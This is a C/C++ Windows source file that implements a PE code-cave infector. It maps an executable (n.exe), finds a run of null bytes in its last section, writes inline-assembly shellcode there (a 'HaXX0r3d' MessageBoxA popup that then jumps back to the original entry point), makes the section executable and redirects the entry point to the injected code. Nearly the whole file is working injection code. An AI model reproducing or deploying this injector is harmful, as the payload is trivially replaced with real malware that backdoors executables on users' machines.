#ifdef _WIN32_WINNT
#undef _WIN32_WINNT
#endif
#define _WIN32_WINNT 0x0501

#ifdef NTDDI_VERSION
#undef NTDDI_VERSION
#endif
#define NTDDI_VERSION 0x05010000

#include "stdafx.h"
#include <Windows.h>
#include <stdio.h>




#define db(x) __asm _emit x

__declspec(naked) void ShellcodeStart(void) {
	__asm {
		pushad
			call    routine

		routine :
		pop     ebp
			sub     ebp, offset routine
			push    0                                // MB_OK
			lea     eax, [ebp + szCaption]
			push    eax                              // lpCaption
			lea     eax, [ebp + szText]
			push    eax                              // lpText
			push    0                                // hWnd
			mov     eax, 0xAAAAAAAA
			call    eax                              // MessageBoxA

			popad
			push    0xAAAAAAAA                       // OEP
			ret

		szCaption :
		db('d') db('T') db('m') db(' ') db('W') db('u') db('Z') db(' ')
			db('h') db('3') db('r') db('e') db(0)
		szText :
			   db('H') db('a') db('X') db('X') db('0') db('r') db('3') db('d')
			   db(' ') db('b') db('y') db(' ') db('d') db('T') db('m') db(0)
	}
}

void ShellcodeEnd() {

}


PIMAGE_DOS_HEADER GetDosHeader(LPBYTE file) {
	return (PIMAGE_DOS_HEADER)file;
}

/*
* returns the PE header
*/
PIMAGE_NT_HEADERS GetPeHeader(LPBYTE file) {
	PIMAGE_DOS_HEADER pidh = GetDosHeader(file);

	return (PIMAGE_NT_HEADERS)((DWORD)pidh + pidh->e_lfanew);
}

/*
* returns the file header
*/
PIMAGE_FILE_HEADER GetFileHeader(LPBYTE file) {
	PIMAGE_NT_HEADERS pinh = GetPeHeader(file);

	return (PIMAGE_FILE_HEADER)&pinh->FileHeader;
}

/*
* returns the optional header
*/
PIMAGE_OPTIONAL_HEADER GetOptionalHeader(LPBYTE file) {
	PIMAGE_NT_HEADERS pinh = GetPeHeader(file);

	return (PIMAGE_OPTIONAL_HEADER)&pinh->OptionalHeader;
}

/*
* returns the first section's header
* AKA .text or the code section
*/
PIMAGE_SECTION_HEADER GetFirstSectionHeader(LPBYTE file) {
	PIMAGE_NT_HEADERS pinh = GetPeHeader(file);

	return (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pinh);
}

PIMAGE_SECTION_HEADER GetLastSectionHeader(LPBYTE file) {
	return (PIMAGE_SECTION_HEADER)(GetFirstSectionHeader(file) + (GetPeHeader(file)->FileHeader.NumberOfSections - 1));
}

BOOL VerifyDOS(PIMAGE_DOS_HEADER pidh) {
	return pidh->e_magic == IMAGE_DOS_SIGNATURE ? TRUE : FALSE;
}

BOOL VerifyPE(PIMAGE_NT_HEADERS pinh) {
	return pinh->Signature == IMAGE_NT_SIGNATURE ? TRUE : FALSE;
}

void main()
{
	HANDLE hFile = INVALID_HANDLE_VALUE;
	PVOID OldValue = NULL;

	//  Disable redirection immediately prior to the native API
	//  function call.
	if (Wow64DisableWow64FsRedirection(&OldValue))
	{
		//  Any function calls in this block of code should be as concise
		//  and as simple as possible to avoid unintended results.



		HANDLE hFile = CreateFile(TEXT("n.exe"), FILE_READ_ACCESS | FILE_WRITE_ACCESS,
			0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		DWORD dwFileSize = GetFileSize(hFile, NULL);

		HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, dwFileSize, NULL);

		LPBYTE lpFile = (LPBYTE)MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, dwFileSize);

		// check if valid pe file
		if (VerifyDOS(GetDosHeader(lpFile)) == FALSE ||
			VerifyPE(GetPeHeader(lpFile)) == FALSE) {
			fprintf(stderr, "Not a valid PE file\n");
			// return 1;
		}

		PIMAGE_NT_HEADERS pinh = GetPeHeader(lpFile);
		PIMAGE_SECTION_HEADER pish = GetLastSectionHeader(lpFile);

		// get original entry point
		DWORD dwOEP = pinh->OptionalHeader.AddressOfEntryPoint +
			pinh->OptionalHeader.ImageBase;

		DWORD dwShellcodeSize = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;

		// find code cave
		DWORD dwCount = 0;
		DWORD dwPosition = 0;

		for (dwPosition = pish->PointerToRawData; dwPosition < dwFileSize; dwPosition++) {
			if (*(lpFile + dwPosition) == 0x00) {
				if (dwCount++ == dwShellcodeSize) {
					// backtrack to the beginning of the code cave
					dwPosition -= dwShellcodeSize;
					break;
				}
			}
			else {
				// reset counter if failed to find large enough cave
				dwCount = 0;
			}
		}

		// if failed to find suitable code cave
		if (dwCount == 0 || dwPosition == 0) {
			//return 1;
		}


		// dynamically obtain address of function
		HMODULE hModule = LoadLibrary(L"user32.dll");

		LPVOID lpAddress = GetProcAddress(hModule, "MessageBoxA");

		// create buffer for shellcode
		HANDLE hHeap = HeapCreate(0, 0, dwShellcodeSize);

		LPVOID lpHeap = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwShellcodeSize);

		// move shellcode to buffer to modify
		memcpy(lpHeap, ShellcodeStart, dwShellcodeSize);


		// modify function address offset
		DWORD dwIncrementor = 0;
		for (; dwIncrementor < dwShellcodeSize; dwIncrementor++) {
			if (*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA) {
				// insert function's address
				*((LPDWORD)lpHeap + dwIncrementor) = (DWORD)lpAddress;
				FreeLibrary(hModule);
				break;
			}
		}

		// modify OEP address offset
		for (; dwIncrementor < dwShellcodeSize; dwIncrementor++) {
			if (*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA) {
				// insert OEP
				*((LPDWORD)lpHeap + dwIncrementor) = dwOEP;
				break;
			}
		}


		// copy the shellcode into code cave
		memcpy((LPBYTE)(lpFile + dwPosition), lpHeap, dwShellcodeSize);
		HeapFree(hHeap, 0, lpHeap);
		HeapDestroy(hHeap);

		// update PE file information
		pish->Misc.VirtualSize += dwShellcodeSize;
		// make section executable
		pish->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
		// set entry point
		// RVA = file offset + virtual offset - raw offset
		pinh->OptionalHeader.AddressOfEntryPoint = dwPosition + pish->VirtualAddress - pish->PointerToRawData;



		//  Immediately re-enable redirection. Note that any resources
		//  associated with OldValue are cleaned up by this call.
		if (FALSE == Wow64RevertWow64FsRedirection(OldValue))
		{
			//  Failure to re-enable redirection should be considered
			//  a criticial failure and execution aborted.
			//return;
		}
	}

	//  The handle, if valid, now can be used as usual, and without
	//  leaving redirection disabled. 
	if (INVALID_HANDLE_VALUE != hFile)
	{
		// Use the file handle
	}
}

